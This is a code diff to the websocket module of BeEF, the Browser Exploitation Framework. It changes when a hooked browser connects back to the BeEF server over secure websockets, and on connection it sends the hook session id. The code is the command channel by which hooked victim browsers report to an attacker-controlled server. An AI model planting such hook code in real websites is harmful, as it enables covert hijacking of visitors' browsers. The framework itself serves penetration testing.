@@ -27,15 +27,18 @@ beef.websocket = {
         var webSocketPort = <%= @websocket_port %>;
         var webSocketSecure = <%= @websocket_secure %>;
         var protocol = "ws://";
-
-        if(webSocketSecure)
+        //console.log("We are inside init");
+        /*use wss only if hooked domain is under https. Mixed-content in WS is quite different from a non-WS context*/
+        if(webSocketSecure && window.location.protocol=="https:"){
             protocol = "wss://";
+        webSocketPort= <%= @websocket_sec_port %>;
+        }
 
-        if (beef.browser.isFF() && !!window.MozWebSocket) {
-            beef.websocket.socket = new MozWebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
+    if (beef.browser.isFF() && !!window.MozWebSocket) {
+        beef.websocket.socket = new MozWebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
 
         } else {
-            beef.websocket.socket = new WebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
+        beef.websocket.socket = new WebSocket(protocol + webSocketServer + ":" + webSocketPort + "/");
         }
 
     },
@@ -43,10 +46,10 @@ beef.websocket = {
     start:function () {
         new beef.websocket.init();
         this.socket.onopen = function () {
-            //console.log("Socket has been opened!");
+        //console.log("Socket has been opened!");
 
-            /*send browser id*/
-            beef.websocket.send('{"cookie":"' + beef.session.get_hook_session_id() + '"}');
+        /*send browser id*/
+        beef.websocket.send('{"cookie":"' + beef.session.get_hook_session_id() + '"}');
             //console.log("Connected and Helo");
             beef.websocket.alive();
         }
